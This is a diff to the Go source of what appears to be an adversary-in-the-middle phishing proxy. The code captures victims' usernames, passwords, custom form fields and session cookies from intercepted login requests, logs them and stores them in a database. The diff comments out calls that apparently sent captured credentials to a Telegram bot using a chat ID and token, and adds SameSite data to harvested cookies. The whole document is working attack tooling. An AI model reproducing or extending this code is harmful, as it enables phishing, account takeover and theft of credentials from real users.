@@ -659,7 +659,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// check for creds in request body
-				trigger := 0
+				//trigger := 0
 				if pl != nil && ps.SessionId != "" {
 
 					req.Header.Set(p.getHomeDir(), o_host)
@@ -680,13 +680,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
 
 						if json_re.MatchString(contentType) {
-							trigger = 0
+							//trigger = 0
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
-									trigger = 1
+									//trigger = 1
 
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
@@ -699,7 +699,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
-									trigger = 1
+									//trigger = 1
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
@@ -712,7 +712,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									cm := cp.search.FindStringSubmatch(string(body))
 									if cm != nil && len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-										trigger = 1
+										//trigger = 1
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
@@ -759,13 +759,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
-							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
-							}
-							
+							//if trigger == 1 {
+							//	readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken, allSessions)
+							//}
 
 						} else if form_re.MatchString(contentType) {
-							trigger = 0
+							//trigger = 0
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -777,7 +776,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
-											trigger = 1
+											//trigger = 1
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
@@ -788,7 +787,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
-											trigger = 1
+											//trigger = 1
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
@@ -800,7 +799,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												trigger = 1
+												//trigger = 1
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
@@ -863,10 +862,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 							}
-							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
-							}
-							
+							//if trigger == 1 {
+							//	readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+							//}
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1011,7 +1009,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires, ck.SameSite)
 							}
 						}
 					}
